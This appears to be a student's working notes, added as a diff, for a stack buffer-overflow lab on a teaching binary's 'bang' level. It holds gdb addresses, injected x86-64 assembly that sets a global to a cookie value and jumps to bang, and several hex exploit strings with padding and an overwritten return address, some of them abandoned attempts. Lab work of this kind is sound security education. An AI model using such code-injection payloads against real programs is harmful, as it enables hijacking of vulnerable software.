@@ -1,0 +1,101 @@
+(gdb) disas
+Dump of assembler code for function bang:
+=> 0x0000000000401020 <+0>
+
+bang address 
+00 40 10 20
+
+(gdb) x/x &global_value
+0x602308 <global_value>:	0x00000000
+
+(gdb) x/x &buf
+0x7fffffffb280:	0x00000000
+
+mov address
+00401032
+
+user id
+0x8e95b5b6b191098
+
+user id in little endian 
+98 10 19 6b 5b 5b e9 08
+
+cookie address
+0x602320
+
+id first 
+$9810196b5b5be908
+
+x/20gx $rsp
+
+move cookie to register
+move register to global
+push return address to stack
+return
+
+mov $0x602320, %rax
+move %rax, $0x602308
+push $0x0000000000401020
+ret
+
+movq $0x602320, %rax
+movq %rax, $0x602308
+pushq $0x401020
+ret
+
+Pre-edit
+
+c0 08 23 60 00 49 bb 98 10 19 6b 5b 5b e9 08 4c 89 18 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+Pre-redo
+movq $0x602308, %rax
+movq $0x8e95b5b6b191098, %r11
+movq %r11, (%rax)
+pushq $0x401020
+retq
+
+want to make it:
+move cookie value to register
+move register to global
+move 
+
+
+movq $0x602308, %rax
+movq $0x9810196b5b5be908, %r11
+movq %r11, (%rax)
+pushq $0x401020
+retq
+
+Old machine code
+48 c7 c0 08 23 60 00 49 bb 08 e9 5b 5b 6b 19 10 98 4c 89 18 68 20 10 40 00 c3
+
+new machine code
+48 8b 14 25 20 23 60 00 48 89 14 25 08 23 60 00 ff 34 25 20 10 40 00 c3
+
+old bang.txt
+48 c7 c0 08 23 60 00 49 bb 08 e9 5b 5b 6b 19 10 98 4c 89 18 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+new bang.txt
+48 8b 14 25 20 23 60 00 48 89 14 25 08 23 60 00 ff 34 25 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+next bang.txt
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 ff 34 25 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+bang.txt 24
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 ff 34 25 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+bang.txt 22
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 ff 34 25 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f
+
+bang.txt 36
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 ff 34 25 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f 00 00
+
+new machine code with $0x.. 32-0's buffer
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f 00 00 00 00 
+
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f 00 00
+
+48 ba 98 10 19 6b 5b 5b e9 08 48 c7 c0 08 23 60 00 48 89 10 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 b2 ff ff ff 7f 00 00
+
+0x00007fffffffff80
+0x00007fffffffffff
